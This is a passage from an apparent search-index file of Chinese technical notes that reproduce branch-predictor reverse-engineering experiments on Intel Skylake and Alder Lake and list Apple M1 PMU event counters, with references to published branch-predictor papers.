&amp; 0x300) &lt;&lt; (8 - 8);\n  *bhb_state ^= (src &amp; 0x3000) &gt;&gt; (12 - 10);\n  *bhb_state ^= (src &amp; 0x30000) &gt;&gt; (16 - 12);\n  *bhb_state ^= (src &amp; 0xc0000) &gt;&gt; (18 - 14);\n}\n</code></pre> <p>\u200b\u8fd9\u200b\u548c\u200b Half&amp;Half \u200b\u8bba\u6587\u200b\u91cc\u200b\u7684\u200b Figure 14 \u200b\u4e5f\u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\uff08\u200b\u9664\u4e86\u200b B13 \u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e24\u6b21\u200b\uff0c\u200b\u8bba\u6587\u200b\u5e94\u8be5\u200b\u662f\u200b\u5199\u9519\u200b\u4e86\u200b\uff0c\u200b\u7b2c\u4e8c\u4e2a\u200b B13 \u200b\u5e94\u8be5\u200b\u4e3a\u200b B15\uff09\uff1a</p> <p></p> <p>\u200b\u4e0d\u8fc7\u200b Haswell \u200b\u67b6\u6784\u200b\u7684\u200b PHR \u200b\u7684\u200b\u4f4d\u6570\u200b\uff0cHalf&amp;Half \u200b\u4e0e\u200b Reading privileged memory with a side-channel \u200b\u7684\u200b\u7ed3\u679c\u200b\u5bf9\u4e0d\u4e0a\u200b\uff0c\u200b\u524d\u8005\u200b\u8ba4\u4e3a\u200b\u662f\u200b 93x2\uff0c\u200b\u540e\u8005\u200b\u8ba4\u4e3a\u200b\u662f\u200b 29x2\u3002\u200b\u6211\u200b\u5728\u200b Broadwell \u200b\u548c\u200b Ivy Bridge EP \u200b\u67b6\u6784\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u4e0a\u6d4b\u200b\u51fa\u6765\u200b\u90fd\u200b\u662f\u200b 93 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-index-tag","title":"PHT \u200b\u7684\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u7528\u5230\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4f4d\u6570","text":"<p>\u200b\u5f97\u5230\u200b PHR \u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u540e\u200b\uff0c\u200b\u4e0b\u200b\u4e00\u6b65\u200b\u5c31\u662f\u200b\u5bf9\u200b PHT \u200b\u8fdb\u884c\u200b\u5206\u6790\u200b\u3002PHT \u200b\u91c7\u7528\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7ed3\u6784\u200b\uff0cPC \u200b\u548c\u200b PHR \u200b\u8ba1\u7b97\u200b\u51fa\u200b Index\uff0c\u200b\u627e\u5230\u200b Set\uff0c\u200b\u7136\u540e\u200b\u5728\u200b Set \u200b\u5185\u90e8\u200b\u627e\u5230\u200b Tag \u200b\u5339\u914d\u200b\u7684\u200b\u9879\u76ee\u200b\uff0c\u200b\u800c\u200b Tag \u200b\u4e5f\u200b\u662f\u200b\u7528\u200b PC \u200b\u548c\u200b PHR \u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5982\u679c\u200b Index \u200b\u548c\u200b Tag \u200b\u7684\u200b\u8ba1\u7b97\u200b\u51fd\u6570\u200b\u90fd\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u90e8\u5206\u200b\u4f4d\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5f53\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b PC \u200b\u7684\u200b\u8fd9\u90e8\u5206\u200b\u4f4d\u6570\u200b\u76f8\u540c\u200b\uff0c\u200b\u4e14\u200b PHR \u200b\u4e5f\u200b\u76f8\u540c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cPHT \u200b\u5c06\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> <p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0c\u200b\u8bba\u6587\u200b\u8bbe\u8ba1\u200b\u4e86\u200b Listing 6 \u200b\u7684\u200b\u5b9e\u9a8c\u200b\uff1a\u200b\u6784\u9020\u200b\u4e24\u4e2a\u200b\u65b9\u5411\u200b\u76f8\u53cd\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u91c7\u7528\u200b\u76f8\u540c\u200b\u7684\u200b PHR\uff0c\u200b\u7136\u540e\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u4f4e\u200b\u82e5\u5e72\u4f4d\u200b\u90fd\u200b\u662f\u200b 0\uff0c\u200b\u7136\u540e\u200b\u89c2\u5bdf\u200b PC \u200b\u591a\u5c11\u200b\u4f4d\u662f\u200b 0 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> <p>\u200b\u5728\u200b Skylake \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u590d\u73b0\u200b\u4e86\u200b\u8bba\u6587\u200b\u4e2d\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u4f4e\u200b 12 \u200b\u4f4d\u200b\u3002</p> <p>\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u5982\u56fe\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u4e5f\u200b\u548c\u200b Indirector \u200b\u91cc\u200b\u5f97\u5230\u200b\u7684\u200b Intel IBP \u200b\u7684\u200b PHT Tag \u200b\u51fd\u6570\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bf4\u660e\u200b CBP \u200b\u548c\u200b IBP \u200b\u53ef\u80fd\u200b\u91c7\u7528\u200b\u4e86\u200b\u7c7b\u4f3c\u200b\u7684\u200b Tag \u200b\u51fd\u6570\u200b\u8bbe\u8ba1\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-set","title":"PHT \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570","text":"<p>\u200b\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d4b\u8bd5\u200b PHT \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u6784\u9020\u200b\u82e5\u5e72\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b Index \u200b\u76f8\u540c\u200b\uff0c\u200b\u4f46\u662f\u200b Tag \u200b\u4e0d\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e9b\u200b\u5206\u652f\u200b\u90fd\u200b\u4f1a\u200b\u5bf9\u5e94\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u91cc\u200b\uff0c\u200b\u7136\u540e\u200b\u4e00\u4e2a\u200b Set \u200b\u91cc\u200b\u8bb0\u5f55\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570\u200b\u3002\u200b\u8bba\u6587\u200b\u6784\u9020\u200b\u4e86\u200b Listing 7 \u200b\u5b9e\u9a8c\u200b\uff0c\u200b\u901a\u8fc7\u200b\u64cd\u63a7\u200b PC \u200b\u5730\u5740\u200b\u4f4e\u4f4d\u200b\u548c\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u9884\u6d4b\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5bf9\u200b PHT \u200b\u7684\u200b\u7ed3\u6784\u200b\u8fdb\u884c\u200b\u63a8\u65ad\u200b\u3002\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u590d\u73b0\u200b\u4e86\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u62d0\u70b9\u200b\u662f\u200b 4 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u8bf4\u660e\u200b\u662f\u200b 4 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\u3002\u200b\u7136\u540e\u200b\u5728\u200b 32 \u200b\u5230\u200b 36 \u200b\u7684\u200b\u5730\u65b9\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u5e73\u200b\u7684\u200b\u5e73\u53f0\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b PC[5] \u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b Index \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5206\u652f\u200b\u4f1a\u200b\u5206\u5e03\u200b\u5728\u200b\u4e24\u4e2a\u200b Set \u200b\u91cc\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Set \u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b 4 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u52a0\u200b\u8d77\u6765\u200b\u603b\u5171\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u9884\u6d4b\u200b 8 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p> <p>\u200b\u4fee\u6539\u200b Listing 7 \u200b\u91cc\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u5f53\u200b\u5b83\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[133] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u200b\u8fd8\u662f\u200b 4\uff0c\u200b\u800c\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[131] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 8\uff0c\u200b\u8bf4\u660e\u200b\u7b2c\u4e8c\u200b\u5927\u200b\u7684\u200b PHT \u200b\u53ea\u7528\u200b\u4e86\u200b PHR \u200b\u7684\u200b\u4f4e\u200b 132 \u200b\u4f4d\u200b\u3002\u200b\u7ee7\u7eed\u200b\u5411\u200b\u4e0b\u8c03\u200b\uff0ck \u200b\u51fa\u73b0\u200b\u5728\u200b PHR[69] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u200b\u8fd8\u662f\u200b 8\uff0c\u200b\u800c\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[67] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 12\u3002\u200b\u8bf4\u660e\u200b\u7b2c\u4e09\u200b\u5927\u200b\u7684\u200b PHT \u200b\u53ea\u7528\u200b\u4e86\u200b PHR \u200b\u7684\u200b\u4f4e\u200b 68 \u200b\u4f4d\u200b\u3002\u200b\u7ee7\u7eed\u200b\u628a\u200b k \u200b\u5411\u4e0b\u200b\u79fb\u52a8\u200b\uff0c\u200b\u5219\u200b\u770b\u4e0d\u5230\u200b\u66f4\u5927\u200b\u7684\u200b\u76f8\u8fde\u200b\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u7684\u200b PHT \u200b\u53ea\u6709\u200b\u4e09\u4e2a\u200b\uff1a</p> <ol> <li>\u200b\u6700\u5c0f\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b 68 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> <li>\u200b\u4e2d\u7b49\u200b\u5927\u5c0f\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b 132 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> <li>\u200b\u6700\u5927\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b\u5b8c\u6574\u200b 388 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> </ol> <p>\u200b\u5e76\u4e14\u200b\u5b83\u4eec\u200b\u90fd\u200b\u662f\u200b\u56db\u8def\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-index-phr-hash","title":"PHT Index \u200b\u4e2d\u200b PHR \u200b\u7684\u200b Hash \u200b\u7b97\u6cd5","text":"<p>\u200b\u8bba\u6587\u200b\u6784\u9020\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u5224\u65ad\u200b PHT Index \u200b\u4e2d\u200b\u54ea\u4e9b\u200b PHR \u200b\u5f02\u6216\u200b\u5230\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u4f4d\u4e0a\u200b\uff0c\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5df2\u77e5\u200b PHT \u200b\u662f\u200b\u56db\u8def\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u4e5f\u200b\u77e5\u9053\u200b PHT Index \u200b\u53ea\u7528\u200b\u4e86\u200b PC[5]\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b PC \u200b\u6ca1\u6709\u200b\u7528\u5230\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6784\u9020\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u7528\u200b PHR=k000...0 \u200b\u4f5c\u4e3a\u200b\u9884\u6d4b\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u4eec\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u4e0a\u200b\uff1b\u200b\u518d\u200b\u6784\u9020\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u7528\u200b PHR=000....0k0...0 \u200b\u4f5c\u4e3a\u200b\u9884\u6d4b\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u6b64\u65f6\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4f1a\u200b\u53d8\u5316\u200b\uff0c\u200b\u8fd9\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u524d\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u548c\u200b\u540e\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b PHR \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u540c\u4e00\u4e2a\u200b Index\uff0c\u200b\u90a3\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u51b2\u7a81\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> <p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0c\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4e86\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u8fd9\u91cc\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u548c\u200b\u8bba\u6587\u200b\u4e2d\u200b\u7a0d\u200b\u6709\u200b\u4e0d\u540c\u200b\uff1a\u200b\u8fd9\u91cc\u200b\u6a2a\u5750\u6807\u200b\u662f\u200b\u8bbe\u7f6e\u200b PHR \u200b\u4e3a\u200b k0 \u200b\u4e4b\u540e\u200b\u518d\u200b\u79fb\u4f4d\u200b PHR \u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u4e2a\u6570\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4e8e\u662f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\u8ba1\u7b97\u200b\u51fa\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff1ak \u200b\u7684\u200b\u4e0b\u6807\u200b\u662f\u200b\u6a2a\u5ea7\u6807\u200b\u4e58\u4ee5\u200b\u4e8c\u52a0\u200b\u4e00\u200b\u3002\u200b\u4ece\u200b\u56fe\u91cc\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5cf0\u503c\u200b\u7684\u200b\u6a2a\u5ea7\u6807\u200b\u5448\u200b\u4e00\u4e2a\u200b\u7b49\u5dee\u6570\u5217\u200b\uff1a67, 76, ... 193\uff0c\u200b\u6570\u5217\u200b\u7684\u200b\u516c\u5dee\u200b\u4e3a\u200b 9\uff0c\u200b\u5bf9\u5e94\u200b 18 \u200b\u4e2a\u200b bit\uff0c\u200b\u8bf4\u660e\u200b PHR[387] \u200b\u548c\u200b PHR[369] \u200b\u548c\u200b PHR[351] \u200b\u7b49\u7b49\u200b\u7b49\u200b\u662f\u200b\u5f02\u6216\u200b\u5728\u200b\u4e00\u8d77\u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u6700\u540e\u200b\u6210\u4e3a\u200b\u4e86\u200b Index \u200b\u7684\u200b\u67d0\u200b\u4e00\u4f4d\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u548c\u200b Indirector \u200b\u7684\u200b IBP \u200b\u7684\u200b Index Hash \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\uff0c\u200b\u867d\u7136\u200b\u4e00\u4e2a\u200b\u662f\u200b CBP\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b IBP\u3002\u200b\u6682\u65f6\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5f80\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u6d4b\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u66f4\u200b\u591a\u200b\u7684\u200b PHT \u200b\u8868\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u586b\u6ee1\u200b\u5c0f\u200b\u7684\u200b\u548c\u200b\u5927\u200b\u7684\u200b PHT\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Half&amp;Half: Demystifying Intel's Directional Branch Predictors for Fast, Secure Partitioned Execution</li> <li>Pathfinder: High-Resolution Control-Flow Attacks Exploiting the Conditional Branch Predictor </li> <li>Indirector: High-Precision Branch Target Injection Attacks Exploiting the Indirect Branch Predictor</li> <li>\u200b\u73b0\u4ee3\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff1a\u200b\u4ece\u200b\u5b66\u672f\u754c\u200b\u5230\u200b\u5de5\u4e1a\u754c\u200b</li> </ul>"},{"location":"hardware/cpu_microarchitecture.html#apple-m1","title":"Apple M1","text":"<p>Apple M1 \u200b\u662f\u200b\u5927\u5c0f\u200b\u6838\u200b\u67b6\u6784\u200b\uff0c\u200b\u5927\u6838\u200b Firestorm \u200b\u67b6\u6784\u200b\uff0c\u200b\u5c0f\u6838\u200b Icestorm \u200b\u67b6\u6784\u200b\u3002</p> <p>\u200b\u6ce8\u200b\uff1aApple M1 \u200b\u548c\u200b Apple A14 Bionic \u200b\u7528\u200b\u7684\u200b\u90fd\u200b\u662f\u200b Firestorm+Icestorm \u200b\u67b6\u6784\u200b\uff0cApple M2 \u200b\u548c\u200b Apple A15 Bionic \u200b\u7528\u200b\u7684\u200b\u90fd\u200b\u662f\u200b Avalanche+Blizzard \u200b\u67b6\u6784\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#linux-pmu","title":"Linux PMU","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0b\u7528\u200b perf_event_open \u200b\u8bbf\u95ee\u200b Apple M1 \u200b\u7684\u200b PMU \u200b\u9700\u8981\u200b\u4f20\u200b\u7279\u6b8a\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ol> <li>perf_event_attr \u200b\u7684\u200b type \u200b\u5fc5\u987b\u200b\u662f\u200b 0xA(Icestorm) \u200b\u6216\u8005\u200b 0xB(Firestorm)\uff0c\u200b\u6839\u636e\u200b\u8981\u200b Profile \u200b\u7684\u200b\u6838\u200b\u51b3\u5b9a\u200b\u4f20\u200b\u54ea\u4e2a\u200b</li> <li>perf_event_attr \u200b\u7684\u200b config \u200b\u7684\u200b\u53d6\u503c\u200b\u89c1\u200b dougallj/applecpu \u200b\u7684\u200b COUNTER_NAMES\uff0c\u200b\u4f8b\u5982\u200b\u6d4b\u91cf\u200b\u5468\u671f\u200b\u6570\u200b\u5c31\u662f\u200b 0x02\uff0c\u200b\u6d4b\u91cf\u200b\u5206\u652f\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u6b21\u6570\u200b\u5c31\u662f\u200b 0xcb</li> <li>perf_event_attr \u200b\u7684\u200b exclude_guest \u200b\u5fc5\u987b\u200b\u8bbe\u200b\u4e3a\u200b 1\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u5f97\u5230\u200b EOPNOTSUPP</li> </ol> <p>counter \u200b\u8ba1\u6570\u5668\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b macOS \u200b\u4e0a\u200b\u4ece\u200b <code>plutil -p /usr/share/kpep/a14.plist</code> \u200b\u547d\u4ee4\u200b\u8f93\u51fa\u200b\u91cc\u200b\u770b\u5230\u200b\uff1a</p> <ul> <li>RETIRE_UOP (1, 0x1): All retired uops</li> <li>CORE_ACTIVE_CYCLE (2, 0x2): Cycles while the core was active</li> <li>L1I_TLB_FILL (4, 0x4): Translations filled into the L1 Instruction TLB</li> <li>L1D_TLB_FILL (5, 0x5): Translations filled into the L1 Data TLB</li> <li>MMU_TABLE_WALK_INSTRUCTION (7, 0x7): Table walk memory requests on behalf of instruction fetches</li> <li>MMU_TABLE_WALK_DATA (8, 0x8): Table walk memory requests on behalf of data accesses</li> <li>L2_TLB_MISS_INSTRUCTION (10, 0xa): Instruction fetches that missed in the L2 TLB</li> <li>L2_TLB_MISS_DATA (11, 0xb): Loads and stores that missed in the L2 TLB</li> <li>MMU_VIRTUAL_MEMORY_FAULT_NONSPEC (13, 0xd): Memory accesses that reached retirement that triggered any of the MMU virtual memory faults</li> <li>SCHEDULE_UOP (82, 0x52): Uops issued by the scheduler to any execution unit</li> <li>INTERRUPT_PENDING (108, 0x6c): Cycles while an interrupt was pending because it was masked</li> <li>MAP_STALL_DISPATCH (112, 0x70): Cycles while the Map Unit was stalled because of Dispatch back pressure</li> <li>MAP_REWIND (117, 0x75): Cycles while the Map Unit was blocked while rewinding due to flush and restart</li> <li>MAP_STALL (118, 0x76): Cycles while the Map Unit was stalled for any reason</li> <li>MAP_INT_UOP (124, 0x7c): Mapped Integer Unit uops</li> <li>MAP_LDST_UOP (125, 0x7d): Mapped Load and Store Unit uops, including GPR to vector register converts</li> <li>MAP_SIMD_UOP (126, 0x7e): Mapped Advanced SIMD and FP Unit uops</li> <li>FLUSH_RESTART_OTHER_NONSPEC (132, 0x84): Pipeline flush and restarts that were not due to branch mispredictions or memory order violations</li> <li>INST_ALL (140, 0x8c): All retired instructions</li> <li>INST_BRANCH (141, 0x8d): Retired branch instructions including calls and returns</li> <li>INST_BRANCH_CALL (142, 0x8e): Retired subroutine call instructions</li> <li>INST_BRANCH_RET (143, 0x8f): Retired subroutine return instructions</li> <li>INST_BRANCH_TAKEN (144, 0x90): Retired taken branch instructions</li> <li>INST_BRANCH_INDIR (147, 0x93): Retired indirect branch instructions including indirect calls</li> <li>INST_BRANCH_COND (148, 0x94): Retired conditional branch instructions (counts only B.cond)</li> <li>INST_INT_LD (149, 0x95): Retired load Integer Unit instructions</li> <li>INST_INT_ST (150, 0x96): Retired store Integer Unit instructions</li> <li>INST_INT_ALU (151, 0x97): Retired non-branch and non-load/store Integer Unit instructions</li> <li>INST_SIMD_LD (152, 0x98): Retired load Advanced SIMD and FP Unit instructions</li> <li>INST_SIMD_ST (153, 0x99): Retired store Advanced SIMD and FP Unit instructions</li> <li>INST_SIMD_ALU (154, 0x9a): Retired non-load/store Advanced SIMD and FP Unit instructions</li> <li>INST_LDST (155, 0x9b): Retired load and store instructions</li> <li>INST_BARRIER (156, 0x9c): Retired data barrier instructions</li> <li>L1D_TLB_ACCESS (160, 0xa0): Load and store accesses to the L1 Data TLB</li> <li>L1D_TLB_MISS (161, 0xa1): Load and store accesses that missed the L1 Data TLB</li> <li>L1D_CACHE_MISS_ST (162, 0xa2): Stores that missed the L1 Data Cache</li> <li>L1D_CACHE_MISS_LD (163, 0xa3): Loads that missed the L1 Data Cache</li> <li>LD_UNIT_UOP (166, 0xa6): Uops that flowed through the Load Unit</li> <li>ST_UNIT_UOP (167, 0xa7): Uops that flowed through the Store Unit</li> <li>L1D_CACHE_WRITEBACK (168, 0xa8): Dirty cache lines written back from the L1D Cache toward the Shared L2 Cache</li> <li>LDST_X64_UOP (177, 0xb1): Load and store uops that crossed a 64B boundary</li> <li>LDST_XPG_UOP (178, 0xb2): Load and store uops that crossed a 16KiB page boundary</li> <li>ATOMIC_OR_EXCLUSIVE_SUCC (179, 0xb3): Atomic or exclusive instruction successfully completed</li> <li>ATOMIC_OR_EXCLUSIVE_FAIL (180, 0xb4): Atomic or exclusive instruction failed (due to contention)</li> <li>L1D_CACHE_MISS_LD_NONSPEC (191, 0xbf): Retired loads that missed in the L1 Data Cache</li> <li>L1D_CACHE_MISS_ST_NONSPEC (192, 0xc0): Retired stores that missed in the L1 Data Cache</li> <li>L1D_TLB_MISS_NONSPEC (193, 0xc1): Retired loads and stores that missed in the L1 Data TLB</li> <li>ST_MEMORY_ORDER_VIOLATION_NONSPEC (196, 0xc4): Retired stores that triggered memory order violations</li> <li>BRANCH_COND_MISPRED_NONSPEC (197, 0xc5): Retired conditional branch instructions that mispredicted</li> <li>BRANCH_INDIR_MISPRED_NONSPEC (198, 0xc6): Retired indirect branch instructions including calls and returns that mispredicted</li> <li>BRANCH_RET_INDIR_MISPRED_NONSPEC (200, 0xc8): Retired return instructions that mispredicted</li> <li>BRANCH_CALL_INDIR_MISPRED_NONSPEC (202, 0xca): Retired indirect call instructions mispredicted</li> <li>BRANCH_MISPRED_NONSPEC (203, 0xcb): Retired branch instructions including calls and returns that mispredicted</li> <li>L1I_TLB_MISS_DEMAND (212, 0xd4): Demand instruction fetches that missed in the L1 Instruction TLB</li> <li>MAP_DISPATCH_BUBBLE (214, 0xd6): Bubble detected in dispatch stage</li> <li>L1I_CACHE_MISS_DEMAND (219, 0xdb): Demand fetch misses that require a new cache line fill of the L1 Instruction Cache</li> <li>FETCH_RESTART (222, 0xde): Fetch Unit internal restarts for any reason. Does not include branch mispredicts</li> <li>ST_NT_UOP (229, 0xe5): Store uops that executed with non-temporal hint</li> <li>LD_NT_UOP (230, 0xe6): Load uops that executed with non-temporal hint</li> </ul> <p>\u200b\u4ee5\u4e0a\u200b\u7ed3\u679c\u200b\u662f\u200b\u7528\u200b python3 cpu_microarchitecture_apple_pmc_dump.py /usr/share/kpep/a14.plist \u200b\u547d\u4ee4\u200b\u8dd1\u200b\u51fa\u6765\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#ras","title":"RAS \u200b\u5927\u5c0f","text":"<p>RAS 